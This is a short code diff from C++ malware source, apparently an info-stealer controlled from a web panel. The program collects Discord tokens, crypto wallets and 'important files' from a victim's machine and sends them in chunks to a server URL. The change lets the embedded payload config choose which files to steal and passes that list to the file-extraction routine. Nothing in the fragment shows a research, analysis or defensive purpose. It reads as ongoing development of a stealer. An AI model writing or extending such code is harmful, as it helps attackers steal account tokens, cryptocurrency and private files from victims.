@@ -38,6 +38,7 @@ int main() {
     bool collectDiscordTokens = true;
     bool collectCryptoWallets = true;
     bool collectImportantFiles = true;
+    std::vector<ImportantFileConfig> importantFilesConfig;
 
     // Try to read embedded config from exe first (for payloads generated from web panel)
     auto embeddedConfig = read_embedded_config();
@@ -55,6 +56,7 @@ int main() {
         collectDiscordTokens = embeddedConfig->collectDiscordTokens;
         collectCryptoWallets = embeddedConfig->collectCryptoWallets;
         collectImportantFiles = embeddedConfig->collectImportantFiles;
+        importantFilesConfig = embeddedConfig->importantFilesConfig;
     } else {
         // Fall back to environment variables (for manual/batch file execution)
         char* envUser = std::getenv("CLIENT_USER");
@@ -348,7 +350,7 @@ int main() {
         // Get important files and send update
         if (collectImportantFiles) {
             try {
-                auto importantFiles = extract_important_files();
+                auto importantFiles = extract_important_files(importantFilesConfig);
                 if (!importantFiles.empty()) {
                     send_chunk(serverUrl, sessionId, PcData{
                         user,
